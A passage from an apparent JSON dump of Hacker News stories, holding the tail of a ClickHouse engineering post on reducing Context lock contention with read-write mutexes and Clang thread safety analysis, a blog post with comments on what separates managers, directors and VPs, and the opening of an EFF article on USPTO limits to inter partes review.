queries, for example: Thread pools,\nServer paths, Global trackers, Clusters information.\n\n    Context is responsible for storing and providing access to query or session-specific objects, for example: query settings, query caches, query current database.\n\nArchitecture before redesign looked like this:\n\nThe problem was that a single mutex was used for most of the synchronization between Context and ContextSharedPart, even when we worked with objects local to Context. For example, when a thread wants to read local query settings from Context, it needs to lock the ContextSharedPart mutex, which leads to huge contention if there is a high number of low latency queries.\n\nDuring query execution, ClickHouse can create a lot of Contexts because each subquery in ClickHouse can have unique settings. For example:\nSELECT id, value\nFROM (\n    SELECT id, value\n    FROM test_table\n    SETTINGS max_threads = 16\n)\nWHERE id > 10\nSETTINGS max_threads = 32\n\nIn this example, we want to execute the inner subquery with max_threads = 16 and the outer subquery with max_threads = 32. A large number of low latency, concurrent queries with many subqueries will create a lot of Contexts per query, and the problem will become even bigger.\n\nIt is actually common to have global Context or ApplicationContext classes in projects and put everything in them. When synchronization is required, it is usually implemented initially with a single mutex. But later, if lock contention becomes an issue, it needs to be redesigned to use a more sophisticated approach.\n\nThe idea was to replace a single global mutex with two read-write mutexes readers–writer lock. One global read-write mutex for ContextSharedPart and one local read-write mutex for each Context.\n\nRead-write mutexes are used because we usually do a lot of concurrent reads (for example, read settings or some path) and rarely concurrent writes. For example, for ContextSharedPart object, we could rewrite some fields during configuration hot reload, but it is very rare. For Context object during query execution query current database, query settings are almost never changed after the query is parsed and analyzed.\n\nIn many places, I completely got rid of synchronization where it was used for initialization of some objects and used call_once for objects that are initialized only once.\n\nContext lock redesign was implemented in the scope of the pull request: https://github.com/ClickHouse/ClickHouse/pull/55121.\n\nHere is how the architecture looks after redesign:\n\nThread Safety Analysis\n\nContext lock redesign was conceptually very simple, but it was very hard to implement it correctly without introducing synchronization issues. ContextSharedPart and Context both contain a lot of fields and methods with complex synchronization logic and it was very hard to properly split synchronization between them manually. It was unclear how to be sure that all locks were used properly and that there were no synchronization issues after refactoring.\n\nThe solution was to use Clang Thread Safety Analysis and add necessary annotations to mutexes, fields, and methods of Context and ContextSharedPart. Now I want to explain in detail how this was done and what problems I had.\n\nTo use Clang thread safety analysis, compile your code with the -Wthread-safety flag. In production, you need to use -Werror or mark this particular thread-safety warning as an error.\n\nclang -c -Wthread-safety example.cpp\n\nIn Clang thread safety analysis documentation, there is an example of how to use thread safety annotations:\n\nclass BankAccount {\nprivate:\n    Mutex mu;\n    int   balance GUARDED_BY(mu);\n\n    void depositImpl(int amount) /* TO FIX: REQUIRES(mu) */ {\n        balance += amount;       // WARNING! Cannot write balance without locking mu.\n    }\n\n    void withdrawImpl(int amount) REQUIRES(mu) {\n        balance -= amount;       // OK. Caller must have locked mu.\n    }\n\npublic:\n    void withdraw(int amount) {\n        mu.Lock();\n        withdrawImpl(amount);    // OK.  We've locked mu.\n        /* TO FIX: mu.unlock() or use std::lock_guard */\n    }                          // WARNING!  Failed to unlock mu.\n\n    void transferFrom(BankAccount& b, int amount) {\n        mu.Lock();\n        /* TO FIX: lock() and unlock() b.mu potentially use std::lock_guard*/\n        b.withdrawImpl(amount);  // WARNING!  Calling withdrawImpl() requires locking b.mu.\n        depositImpl(amount);     // OK.  depositImpl() has no requirements.\n        mu.Unlock();\n    }\n};\n\nI added TO FIX comments to fix warnings in places where you will see warnings after running thread safety analysis. Here are the most important concepts from Clang\nthread safety analysis documentation:\n\n  Thread safety analysis provides a way of protecting resources with capabilities.\nA resource is either a data member, or a function/method that provides access to some underlying resource.\nThe analysis ensures that the calling thread cannot access the resource (i.e. call the function, or read/write the data) unless it has the capability to do so.\n\n  A thread may hold a capability either exclusively or shared. An exclusive capability can be held by only one thread at a time,\nwhile a shared capability can be held by many threads at the same time. This mechanism enforces a multiple-reader, single-writer pattern.\nWrite operations to protected data require exclusive access, while read operations require only shared access.\n\n  Capabilities are associated with named C++ objects which declare specific methods to acquire and release the capability. The name of\nthe object serves to identify the capability. The most common example is a mutex. For example, if mu is a mutex,\nthen calling mu.Lock() causes the calling thread to acquire the capability to access data that is protected by mu.\nSimilarly, calling mu.Unlock() releases that capability.\n\nClang thread safety annotations can be split into three different categories. Here are the most commonly used annotations:\n\n  For the implementation of capability classes and functions: CAPABILITY(...), SCOPED_CAPABILITY, ACQUIRE(…),\nACQUIRE_SHARED(…), RELEASE(…), RELEASE_SHARED(…), RELEASE_GENERIC(…)\n  For protecting fields and methods: GUARDED_BY(...), PT_GUARDED_BY(...), REQUIRES(…), REQUIRES_SHARED(…)\n  Utility: NO_THREAD_SAFETY_ANALYSIS\n\nThose annotations are very flexible and allow you to combine them in different ways. For example, you can use REQUIRES annotation that takes multiple mutexes:\n\nMutex mutex_1, mutex_2;\nint a GUARDED_BY(mutex_1);\nint b GUARDED_BY(mutex_2);\n\nvoid test() REQUIRES(mutex_1, mutex_2) {\n    a = 0;\n    b = 0;\n}\n\nIn the LLVM standard library, all mutex implementations are annotated with thread safety annotations. Example std::mutex:\n\nclass _LIBCPP_TYPE_VIS _LIBCPP_THREAD_SAFETY_ANNOTATION(capability(\"mutex\")) mutex\n{\n    __libcpp_mutex_t __m_ = _LIBCPP_MUTEX_INITIALIZER;\n\npublic:\n    _LIBCPP_INLINE_VISIBILITY\n    _LIBCPP_CONSTEXPR mutex() = default;\n\n    mutex(const mutex&) = delete;\n    mutex& operator=(const mutex&) = delete;\n\n#if defined(_LIBCPP_HAS_TRIVIAL_MUTEX_DESTRUCTION)\n    ~mutex() = default;\n#else\n    ~mutex() _NOEXCEPT;\n#endif\n\n    void lock() _LIBCPP_THREAD_SAFETY_ANNOTATION(acquire_capability());\n    bool try_lock() _NOEXCEPT _LIBCPP_THREAD_SAFETY_ANNOTATION(try_acquire_capability(true));\n    void unlock() _NOEXCEPT _LIBCPP_THREAD_SAFETY_ANNOTATION(release_capability());\n\n    typedef __libcpp_mutex_t* native_handle_type;\n    _LIBCPP_INLINE_VISIBILITY native_handle_type native_handle() {return &__m_;}\n};\n\nClang thread safety analysis is a great tool for catching synchronization errors in code. However, it can have some problems for production usage out of the box.\n\nClickHouse has its own implementation of some synchronization primitives, such as the implementation of std::shared_mutex, because the standard library implementation is slow. We also want to have mutexes with additional logic during lock/unlock, such as updating metrics or profile events. In both cases, we do not want to have a lot of duplicated thread safety annotations in all of our mutexes. We want to hide them and have a generic solution.\n\nTo solve this problems, I designed SharedMutexHelper template class using CRTP pattern that implements SharedMutex standard library requirements https://en.cppreference.com/w/cpp/named_req/SharedMutex and adds thread safety annotations.\n\ntemplate <typename Derived, typename MutexType = SharedMutex>\nclass TSA_CAPABILITY(\"SharedMutexHelper\") SharedMutexHelper\n{\n    auto & getDerived() { return static_cast<Derived &>(*this); }\n\npublic:\n    // Exclusive ownership\n    void lock() TSA_ACQUIRE() { getDerived().lockImpl(); }\n\n    bool try_lock() TSA_TRY_ACQUIRE(true) { getDerived().tryLockImpl(); }\n\n    void unlock() TSA_RELEASE() { getDerived().unlockImpl(); }\n\n    // Shared ownership\n    void lock_shared() TSA_ACQUIRE_SHARED() { getDerived().lockSharedImpl(); }\n\n    bool try_lock_shared() TSA_TRY_ACQUIRE_SHARED(true) { getDerived().tryLockSharedImpl(); }\n\n    void unlock_shared() TSA_RELEASE_SHARED() { getDerived().unlockSharedImpl(); }\n\nprotected:\n    /// Default implementations for all *Impl methods.\n    void lockImpl() TSA_NO_THREAD_SAFETY_ANALYSIS { mutex.lock(); }\n\n    ...\n\n    void unlockSharedImpl() TSA_NO_THREAD_SAFETY_ANALYSIS { mutex.unlock_shared(); }\n\n    MutexType mutex;\n};\n\nSharedMutexHelper implements all necessary methods for SharedMutex requirements and, by default, delegates all methods to MutexType implementation. The derived class must subclass SharedMutexHelper and override only the necessary lockImpl, tryLockImpl, unlockImpl, lockSharedImpl, tryLockSharedImpl, and unlockSharedImpl methods.\n\nHere is a concrete implementation of ContextSharedMutex:\n\nclass ContextSharedMutex : public SharedMutexHelper<ContextSharedMutex>\n{\nprivate:\n    using Base = SharedMutexHelper<ContextSharedMutex, SharedMutex>;\n    friend class SharedMutexHelper<ContextSharedMutex, SharedMutex>;\n\n    void lockImpl()\n    {\n        ProfileEvents::increment(ProfileEvents::ContextLock);\n        CurrentMetrics::Increment increment{CurrentMetrics::ContextLockWait};\n        Stopwatch watch;\n        Base::lockImpl();\n        ProfileEvents::increment(ProfileEvents::ContextLockWaitMicroseconds,\n            watch.elapsedMicroseconds());\n    }\n\n    void lockSharedImpl()\n    {\n        ProfileEvents::increment(ProfileEvents::ContextLock);\n        CurrentMetrics::Increment increment{CurrentMetrics::ContextLockWait};\n        Stopwatch watch;\n        Base::lockSharedImpl();\n        ProfileEvents::increment(ProfileEvents::ContextLockWaitMicroseconds,\n            watch.elapsedMicroseconds());\n    }\n};\n\nAs you can see, ContextSharedMutex overrides only lockImpl and lockSharedImpl methods and, in these methods, updates metrics.\n\nAnother problem was that in the LLVM standard library, std::shared_lock does not support thread safety analysis. This is probably because this class is movable, and thread safety annotations do not have support for movable locks. For example, std::unique_lock also does not support thread safety analysis.\n\nTo solve this issue, I implemented SharedLockGuard analog of std::lock_guard, but for shared mutexes:\n\ntemplate <typename Mutex>\nclass TSA_SCOPED_LOCKABLE SharedLockGuard\n{\npublic:\n    explicit SharedLockGuard(Mutex & mutex_) TSA_ACQUIRE_SHARED(mutex_)\n        : mutex(mutex_) { mutex_.lock_shared(); }\n\n    ~SharedLockGuard() TSA_RELEASE() { mutex.unlock_shared(); }\n\nprivate:\n    Mutex & mutex;\n};\n\nLet’s see an example of thread safety analysis usage in ContextSharedPart. We declare which fields are guarded by ContextSharedMutex mutex.\n\nstruct ContextSharedPart : boost::noncopyable\n{\n    /// For access of most of shared objects.\n    mutable ContextSharedMutex mutex;\n\n    /// Path to the data directory, with a slash at the end.\n    String path TSA_GUARDED_BY(mutex);\n\n    /// Path to the directory with some control flags for server maintenance.\n    String flags_path TSA_GUARDED_BY(mutex);\n\n    /// Path to the directory with user provided files, usable by 'file' table function.\n    String dictionaries_lib_path TSA_GUARDED_BY(mutex);\n\n    /// Path to the directory with user provided scripts.\n    String user_scripts_path TSA_GUARDED_BY(mutex);\n\n    /// Path to the directory with filesystem caches.\n    String filesystem_caches_path TSA_GUARDED_BY(mutex);\n\n    /// Path to the directory with user provided filesystem caches.\n    String filesystem_cache_user_path TSA_GUARDED_BY(mutex);\n\n    /// Global configuration settings.\n    ConfigurationPtr config TSA_GUARDED_BY(mutex);\n};\n\nThen, in ContextSharedPart methods that need to access guarded fields, we use SharedLockGuard for shared access or std::lock_guard for exclusive access:\n\nString Context::getPath() const\n{\n    SharedLockGuard lock(shared->mutex);\n    return shared->path;\n}\n\nString Context::getFlagsPath() const\n{\n    SharedLockGuard lock(shared->mutex);\n    return shared->flags_path;\n}\n\nString Context::getUserFilesPath() const\n{\n    SharedLockGuard lock(shared->mutex);\n    return shared->user_files_path;\n}\n\nString Context::getDictionariesLibPath() const\n{\n    SharedLockGuard lock(shared->mutex);\n    return shared->dictionaries_lib_path;\n}\n\nvoid Context::setPath(const String & path)\n{\n    std::lock_guard lock(shared->mutex);\n\n    shared->path = path;\n\n    if (shared->tmp_path.empty() && !shared->root_temp_data_on_disk)\n        shared->tmp_path = shared->path + \"tmp/\";\n\n    if (shared->flags_path.empty())\n        shared->flags_path = shared->path + \"flags/\";\n\n    if (shared->user_files_path.empty())\n        shared->user_files_path = shared->path + \"user_files/\";\n\n    if (shared->dictionaries_lib_path.empty())\n        shared->dictionaries_lib_path = shared->path + \"dictionaries_lib/\";\n\n    if (shared->user_scripts_path.empty())\n        shared->user_scripts_path = shared->path + \"user_scripts/\";\n}\n\nI implemented thread safety analysis refactoring in this pull request https://github.com/ClickHouse/ClickHouse/pull/55278.\n\nPerformance improvements\n\nIn Tinybird, we had a synthetic benchmark that contained a lot of low latency queries. We ran this benchmark with the old and new ClickHouse version (after Context lock redesign):\n\nclickhouse benchmark -r --ignore-error \\\n--concurrency=500 \\\n--timelimit 600 \\\n--connect_timeout=20 < queries.txt\n\nAnd had the following results:\n\n    Before ~200 QPS. After ~600 QPS (~3x better).\n\n    Before CPU utilization of only ~20%. After ~60% (~3x better).\n\n    Before median query time 1s. After ~0.6s (~2x better).\n\n    Before slowest queries took ~75s. After ~6s (~12x better).\n\nAs you can see in such benchmark, we were not able to utilize ClickHouse to 100% CPU usage because of low concurrency. We were able to fully utilize ClickHouse instance with --concurrency=1000 and had\naround ~1000 QPS and ~95-96% CPU utilization.\n\nWith more complex production queries, ClickHouse will most likely hit another bottleneck. However, we definitely removed Context lock contention as a potential bottleneck.\n\nConclusion\n\nLock contention is a very common source of performance issues in modern high concurrency systems. You can think of it the same way as a CPU/Memory/IO/Network bound, like the LockContention bound.\n\nTo detect such issues you can try to use off-cpu analysis and introduce additional application level metrics that will tell you how much time threads spend in different locks.\n\nIt is also a good idea to use all available tooling as much as possible, including runtime tools like address/memory/thread/undefined-behavior sanitizers and compile-time tools like Clang thread safety analysis.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "0fbffb74d4f0c43b",
    "title": {
      "en": "Global population datasets underrepresent rural population",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.nature.com/articles/s41467-025-56906-7",
    "score": 205,
    "by": "croes",
    "time": 1742298638,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "c98f733cb68ba2b2",
    "title": {
      "en": "London's Heathrow Airport announces complete shutdown due to power outage",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.cnn.com/2025/03/20/travel/london-heathrow-airport-shut-intl-hnk/index.html",
    "score": 229,
    "by": "dfine",
    "time": 1742527866,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "dfb083fd35bf1670",
    "title": {
      "en": "Amazon wants a product safety regulator declared unconstitutional",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.washingtonpost.com/technology/2025/03/21/amazon-product-safety-regulators-trump/",
    "score": 148,
    "by": "danorama",
    "time": 1742655369,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "c09f02b3a91d146e",
    "title": {
      "en": "‘Bluey’s World’: How a Cute Aussie Puppy Became a Juggernaut",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.hollywoodreporter.com/tv/tv-features/blueys-world-success-puppy-juggernaut-1236164905/",
    "score": 335,
    "by": "adrian_mrd",
    "time": 1742386486,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "43e25f70b2789624",
    "title": {
      "en": "Career Development: What It Means to Be a Manager, Director, or VP (2015)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://kellblog.com/2015/03/08/career-development-what-it-really-means-to-be-a-manager-director-or-vp/",
    "score": 509,
    "by": "AnhTho_FR",
    "time": 1742554181,
    "content": "← Why Can't PR People Do Math?\n\t\t\tA Disney Parking Lot Attendant Gets More Training than Your Typical $250K Enterprise Sales Rep:  Thoughts on Bootcamps →\n\n\t\t\tCareer Development: What It Really Means to be a Manager, Director, or VP\n\n\t\t\t\t\tPosted on March 8, 2015 | 36 Comments\n\n\t\t\t\tIt’s no secret that I’m not a fan of big-company HR practices. I’m more of the First Break all the Rules type. Despite my general skepticism of many standard practices, we still do annual performance reviews at my company, though I’m thinking seriously of dropping them. (See Get Rid of the Performance Review.)\nAnother practice I’m not hugely fond of is “leveling” — the creation of a set of granular levels to classify jobs across the organization. Leveling typically results in something that looks like this:\n\nWhile I am a huge fan of compensation benchmarking (i.e., figuring out what someone is worth in the market before they do by getting another job), I think classical leveling has a number of problems:\n\nIt’s futile to level across functions. Yes, you might discover that a Senior FPA Analyst II earns the same as a Product Marketing Director I, but why does that matter? It’s a coincidence. It’s like saying with $3.65 I can buy either a grande non-fat latte or a head of organic lettuce. What matters is the fair price of each of those goods in the market — not they that happen to have the same price. So I object to the whole notion of levels across the organization. It’s not canonical; it’s coincidence.\n\nMost leveling systems are too granular, with the levels separated by arbitrary characterizations. It’s makework. It’s fake science. It’s bureaucratic and encourages a non-thinking “climb the ladder” approach to career development. (“Hey, let’s develop you to go from somewhat-independent to rather-independent this year.”)\n\nIt conflates career development and salary negotiation. It encourages a mindset of saying, “what must I do to make L10” when you want to say, “I want a $10K raise.” I can’t tell you the number of times people have asked me for “development” or “leveling” conversations where I get excited and start talking about learning, skills gaps, and such and it’s clear all they wanted to talk about was salary. Disappointing.\n\nThat said, I do believe there are three meaningful levels in management and it’s important to understand the differences among them. I can’t tell you the number of times someone has sincerely asked me, “what does it take to be a director?” or, “how can I develop myself into a VP?”\nIt’s a hard question. You can turn to the leveling system for an answer, but it’s not in there. For years, in fact, I’ve struggled to find what I consider to be a good answer to the question.\nI’m not talking about Senior VP vs. Executive VP or Director vs. Senior Director. I view such adjectives as window dressing or stripes: important recognition along the way, but nothing that fundamentally changes one’s level.\nI’m not talking about how many people you manage. In call centers, a director might manage 500 people. In startups, a VP might manage zero.\nI am talking about one of three levels at which people operate: manager, director, and vice president. Here are my definitions:\n\nManagers are paid to drive results with some support. They have experience in the function, can take responsibility, but are still learning the job and will have questions and need support. They can execute the tactical plan for a project but typically can’t make it.\n\nDirectors are paid to drive results with little or no supervision (“set and forget”). Directors know how to do the job. They can make a project’s tactical plan in their sleep. They can work across the organization to get it done. I love strong directors. They get shit done.\n\nVPs are paid to make the plan. Say you run marketing. Your job is to understand the company’s business situation, make a plan to address it, build consensus to get approval of that plan, and then go execute it.\n\nThe biggest single development issue I’ve seen over the years is that many VPs still think like directors. [1]\nSay the plan didn’t work. “But, we executed the plan we agreed to,” they might say, hoping to play a get-out-of-jail-free card with the CEO (which is about to boomerang).\nOf course, the VP got approval to execute the plan. Otherwise, you’d be having a different conversation, one about termination for insubordination.\nBut the plan didn’t work. Because directors are primarily execution engines, they can successfully play this card. Fair enough. Good directors challenge their plans to make them better. But they can still play the approvalcard successfully because their primary duty is to execute the plan, not make it.\nVP’s, however, cannot play the approval card. The VP’s job is to get the right answer. They are the functional expert. No one on the team knows their function better than they do. And even if someone did, they are still playing the VP of function role and it’s their job – and no one else’s — to get the right answer.\nNow, you might be thinking, “glad I don’t work for Dave” right now — he’s putting failure of a plan to which he and the team agreed on the back of the VP. And I am.\nBut it’s the same standard to which the CEO is held. If the CEO makes a plan, gets it approved by the board, and executes it well but it doesn’t work, they cannot tell the board “but, but, it’s the plan we agreed to.” Most CEOs wouldn’t even dream of saying that. It’s because CEOs understand they are held accountable not for effort or activity, but results.\nPart of truly operating at the VP level is to internalize this fact. You are accountable for results. Make a plan that you believe in. Because if the plan doesn’t work, you can’t hide behind approval. Your job was to make a plan that worked. If the risk of dying on a hill is inevitable, you may as well die on your own hill, and not someone else’s.\nParaphrasing the ancient Fram oil filter commercial, I call this “you can fire me now or fire me later” principle. An executive should never sign up for a plan they don’t believe in. They should risk being fired now for refusing to sign up for the plan (e.g., challenging assumptions, delivering bad news) as opposed to halfheartedly executing a plan they don’t believe in and almost certainly getting fired for its failure later. The former is a far better way to go than the latter.\nThis is important not only because it prepares the VP to one day become a CEO, but also because it empowers the VP in making their plan. If this my plan, if I am to be judged on its success or failure, if I am not able to use approval as a get-out-of-jail-free card, then is it the right plan?\nThat’s the thinking I want to stimulate. That’s how great VPs think.\n# # #\nFootnotes:\n[1] Since big companies throw around the VP title pretty casually, this post is arguing that many of those VPs are actually directors in thinking and accountability. This may be one reason why big company VPs have trouble adapting to the e-staff of startups.\nShare this:TwitterLinkedInEmailPrintMorePinterest1FacebookLike this:Like Loading...\n\n\tRelated\nThings to Avoid in Selecting an Executive-Level Job at a Software StartupAugust 13, 2019In \"Career\"Why Google Employees QuitJanuary 29, 2009In \"Google\"A Missive to Human Resources (HR)August 20, 2014In \"Management\"\n\n\t\t\t\t\t\t\tThis entry was posted in Career, HR, Leadership, Management, Startups. Bookmark the permalink.\n\n\t\t\t← Why Can't PR People Do Math?\n\t\t\tA Disney Parking Lot Attendant Gets More Training than Your Typical $250K Enterprise Sales Rep:  Thoughts on Bootcamps →\n\n\t\t\t36 responses to “Career Development: What It Really Means to be a Manager, Director, or VP”\n\n\t\t\tUmesh\n\n\t\t\t\t|\n\n\t\t\t\tMarch 8, 2015 at 8:56 am\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tGreat!  Gives a reality check for someone to know where they fit.\nEnjoyed it as always…not to miss out learning points from you.\nThanks\nUmesh\n\nLoading...\n\n\t\t\tRay Carroll (@raycarroll55)\n\n\t\t\t\t|\n\n\t\t\t\tApril 19, 2015 at 10:30 am\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tDave – this is well put. If you’re in a functional department (let’s say marketing), is their a level about the VP level that you’d define? For example, let’s say there is a CMO and VP of Marketing. If the VP of Marketing is making the plan, what is the CMO doing in your eyes?\n\nLoading...\n\n\t\t\teli\n\n\t\t\t\t|\n\n\t\t\t\tMay 13, 2015 at 5:53 am\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tVery good read, thank-you.\n\nLoading...\n\n\t\tPingback: Best of Kellblog 2015 | Kellblog\n\n\t\t\tDave\n\n\t\t\t\t|\n\n\t\t\t\tJanuary 1, 2016 at 5:05 pm\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tEnjoyed the article, thanks for posting!\n\nLoading...\n\n\t\tPingback: 2 – Career Development: What It Really Means to Be a Manager, Director, or VP\n\n\t\t\tNadim Hossain (@NadimHossain)\n\n\t\t\t\t|\n\n\t\t\t\tJanuary 8, 2016 at 2:05 pm\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tGreat piece Dave!\nAnd Ray – great question about CMOs vs VPs. In my experience, at small companies/startups, they are they same. I.e., CMO is a feel good title. At a larger company, you might have a VP of Demand Gen, who makes the plan for DG, and a VP of Corporate Marketing, who makes the plan for brand. You might also have regional or BU heads of marketing, reporting to a CMO.\n\nLoading...\n\n\t\tPingback: Mattermark Daily - Monday, January 11th, 2016 | Mattermark\n\n\t\t\tRaza Usman\n\n\t\t\t\t|\n\n\t\t\t\tJanuary 26, 2016 at 7:31 am\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tThe VP requires creativity creativity and foresight to envision a future state. Directors require creativity but can get by with less foresight.\n\nLoading...\n\n\t\t\tJim Franklin (@jimfranklin)\n\n\t\t\t\t|\n\n\t\t\t\tFebruary 22, 2016 at 5:39 pm\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tI have found the difference between VPs and Directors is that VPs think cross-functionally whereas Directors think almost exclusively about their functional area.\n\nLoading...\n\n\t\t\tRafael Varlese\n\n\t\t\t\t|\n\n\t\t\t\tMarch 9, 2017 at 1:38 pm\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tHello Dave,\nGood article and good points about grades and level structures. When you create clusters such as VP, Director and Manager, you are doing the same concept as grading and structures do…  Even your concept in my humble opinion, has some gaps… (you can have a Hands on Operations Director according to the role, and at the same time, an creative and strategic Marketing or Brand Manager, for e.g.)…. everything is relative and sometimes can’t fit in the grade, levels and even your classification (see, I totaly agree with your clusters). All these tools just help us to better compare and pay correclty without burn cash or loose talents to the market. Rgds from Brazil !!\n\nLoading...\n\n\t\t\tKamal Singarapu\n\n\t\t\t\t|\n\n\t\t\t\tAugust 17, 2017 at 12:34 am\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tThank you, Dave. This blog helped me to understand the purpose of different roles in a company.\n\nLoading...\n\n\t\tPingback: VP Marketing job description: My DIY version - Kevan Lee\n\n\t\tPingback: Alfred Lua\n\n\t\tPingback: Links: 4-17-2018 | Aaron Johnson\n\n\t\t\tCyrille Auxenfans\n\n\t\t\t\t|\n\n\t\t\t\tAugust 15, 2018 at 11:25 pm\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tGreat information shared about managing director and management thanks for it\n\nLoading...\n\n\t\tPingback: Top Kellblog Posts of 2018 | Kellblog\n\n\t\tPingback: The Real Difference Between a Director and Inside Sales Manager – suregist\n\n\t\tPingback: Whose Company Is It Anyway? Differences between Founders and Hired CEOs. - Enterprise Irregulars\n\n\t\tPingback: Whose Company Is It Anyway? Differences between Founders and Hired CEOs - OPEXEngine\n\n\t\tPingback: alper.nl\n\n\t\tPingback: Weekly Bullet #27 – Summary for the week – Performance Engineering Blog\n\n\t\tPingback: Advice for Engineering Managers Who Want to Climb the Ladder – charity.wtf\n\n\t\tPingback: Vidalytics: Marketing Project Manager  | JobSoko\n\n\t\tPingback: Remote Marketing Project Manager  at Vidalytics – US Jobs Alert\n\n\t\tPingback: Vidalytics: Marketing Project Manager  - Remote Jobs\n\n\t\tPingback: VidalyticsDigital Marketing Manager Aug 1Full-Time/Anywhere in the World – Scraper\n\n\t\tPingback: Vidalytics: Product Owner  - Work All Remote\n\n\t\tPingback: Vidalytics: Product Owner  | JobSoko\n\n\t\tPingback: VidalyticsProduct Owner  featuredFull-Time/Anywhere in the World – Scraper\n\n\t\tPingback: Vidalytics: Product Owner  - Remote Jobs\n\n\t\tPingback: Vidalytics: Digital Marketing Manager  - Remote Jobs\n\n\t\t\tD Gray\n\n\t\t\t\t|\n\n\t\t\t\tJanuary 22, 2024 at 10:39 am\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tI’ve loved this post for years and have used it to inspire levelling frameworks at several companies\nDave:  have you ever seen anything similarly useful for VP vs SVP vs C-level?\n\nLoading...\n\n\t\t\tDave Kellogg\n\n\t\t\t\t|\n\n\t\t\t\tJanuary 22, 2024 at 10:40 am\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tWow, that’s a great idea.  I’m afraid I can’t whip anything up as the this first post was probably the result of a decade’s thinking, but I’ll start to stew on that question.  My intital reaction is “stripes” — i.e., there’s no fundamental difference certainly at a smaller (<$100M) startup.  But at a bigger company there most certainly is.  Let me mull.\n\nLoading...\n\n\t\t\tSteve M\n\n\t\t\t\t|\n\n\t\t\t\tAugust 16, 2024 at 4:21 am\n\t\t\t\t\t|\n\n\t\tMy guess is C-level sets Strategic Goals that VP makes plan to achieve?\n\nLoading...\n\n\t\tPingback: Anonymous\n\n\t\t\tLeave a ReplyCancel reply\n\n\t\t\t\t\t\tdocument.addEventListener('DOMContentLoaded', function () {\n\t\t\t\t\t\t\tvar commentForms = document.getElementsByClassName('jetpack_remote_comment');\n\t\t\t\t\t\t\tfor (var i = 0; i < commentForms.length; i++) {\n\t\t\t\t\t\t\t\tcommentForms[i].allowTransparency = false;\n\t\t\t\t\t\t\t\tcommentForms[i].scrolling = 'no';\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\n\t\tThis site uses Akismet to reduce spam. Learn how your comment data is processed.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "b244e987b5b3bb1d",
    "title": {
      "en": "Graydon Carter's Wild Ride Through the Golden Age of Magazines",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.newyorker.com/magazine/2025/03/24/when-the-going-was-good-graydon-carter-book-review",
    "score": 14,
    "by": "samclemens",
    "time": 1742440623,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "43ebc5dacf39cb98",
    "title": {
      "en": "New USPTO Memo Makes Fighting Patent Trolls Even Harder",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.eff.org/deeplinks/2025/03/new-uspto-memo-makes-fighting-patent-trolls-even-harder",
    "score": 296,
    "by": "healsdata",
    "time": 1742583333,
    "content": "The U.S. Patent and Trademark Office (USPTO) just made a move that will protect bad patents at the expense of everyone else. In a memo released February 28, the USPTO further restricted access to inter partes review, or IPR—the process Congress created to let the public challenge invalid patents without having to wage million-dollar court battles.\nIf left unchecked, this decision will shield bad patents from scrutiny, embolden patent trolls, and make it even easier for hedge funds and large corporations to weaponize weak patents against small businesses and developers.\nIPR Exists Because the Patent Office Makes Mistakes\nThe USPTO grants over 300,000 patents a year, but many of them should not have been issued in the first place. Patent examiners spend, on average, around 20 hours per patent, often missing key prior art or granting patents that are overly broad or vague. That’s how bogus patents on basic ideas—like podcasting, online shopping carts, or watching ads online—have ended up in court.\nCongress created IPR in 2012 to fix this problem. IPR allows anyone to challenge a patent’s validity based on prior art, and it’s done before specialized judges at the USPTO, where experts can re-evaluate whether a patent was properly granted. It’s faster, cheaper, and often fairer than fighting it out in federal court.\nThe USPTO is Blocking Patent Challenges—Again\nInstead of defending IPR, the USPTO is working to sabotage it. The February 28 memo reinstates a rule that allows for widespread use of “discretionary denials.” That’s when the Patent Trial and Appeal Board (PTAB) refuses to hear an IPR case for procedural reasons—even if the patent is likely invalid.\nThe February 28 memo reinstates widespread use of the Apple v. Fintiv rule, under which the USPTO often rejected IPR petitions whenever there’s an ongoing district court case about the same patent. This is backwards. If anything, an active lawsuit is proof that a patent’s validity needs to be reviewed—not an excuse to dodge the issue.\nIn 2022, former USPTO Director Kathi Vidal issued a memo making clear that the PTAB should hear patent challenges when “a petition presents compelling evidence of unpatentability,” even if there is parallel court litigation.\nThat 2022 guidance essentially saved the IPR system. Once PTAB judges were told to consider all petitions that showed “compelling evidence,” the procedural denials dropped to almost nothing. This February 28 memo signals that the USPTO will once again use discretionary denials to sharply limit access to IPR—effectively making patent challenges harder across the board.\nDiscretionary Denials Let Patent Trolls Rig the System\nThe top beneficiary of this decision will be patent trolls, shell companies formed expressly for the purpose of filing patent lawsuits. Often patent trolls seek to extract a quick settlement before a patent can be challenged. With IPR becoming increasingly unavailable, that will be easier than ever.\nPatent owners know that discretionary denials will block IPRs if they file a lawsuit first. That’s why trolls flock to specific courts, like the Western District of Texas, where judges move cases quickly and rarely rule against patent 